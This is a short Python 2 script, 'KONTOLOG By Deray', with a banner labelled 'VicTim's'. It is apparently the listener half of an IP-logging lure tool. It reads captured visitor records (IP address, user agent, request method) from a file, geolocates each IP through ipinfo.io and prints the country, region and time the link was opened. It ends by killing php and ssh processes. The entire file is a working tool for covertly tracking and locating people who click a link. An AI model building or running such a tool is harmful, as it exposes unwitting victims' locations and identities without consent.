import os,sys,time,json,requests
os.system("clear")
print """
KONTOLOG By Deray
====================================================
 _________
< VicTim's >
 ---------              me... ouhh ohh
  \                 __ /
   \               (xx)
    \              (U )
     \             /--\\
       __         / \  \ 
      UxxU\.'@@@@@@`.\  )
      \__/(@@@@@@@@@@) /
           (@@@@@@@@)(( 
           `YY~~~~YY' \\
            ||    ||   >> 
"""
open("geo/haha.txt","w")
while True:
	if os.path.getsize("geo/haha.txt") !=0:
		file=open("geo/haha.txt").read()
		js=json.loads(file)
		try:
			r=requests.get("http://ipinfo.io/{}/json".format(
				js["ip"])).json()
		except Exception as f:
			print "[!] {}".format(f)
			exit()
		print "\r[=] USER-AGENT: {}".format(js["ua"])
		print "\r[=] METOD  : {}".format(js["rq"])
		print "\r[=] IPADDR : {}".format(js["ip"])
		print "\r[=] LOCATE : {}".format(r["country"])
		print "\r[=] REGION : {}".format(r["region"])
		print "\r[=] OPEN AT: {} {}:{} {}sec".format(
			time.localtime()[0],
			time.localtime()[3],
			time.localtime()[4],
			time.localtime()[5]
		)
		print "\r"+"="*50
		open("geo/haha.txt","w")
		
	else:
		a=["|","/","-","\\"]
		for x in a:
			print "\r[+] Listening Log .. {}  ".format(
				x
			),;sys.stdout.flush();time.sleep(0.20)
os.system("killall php;killall ssh")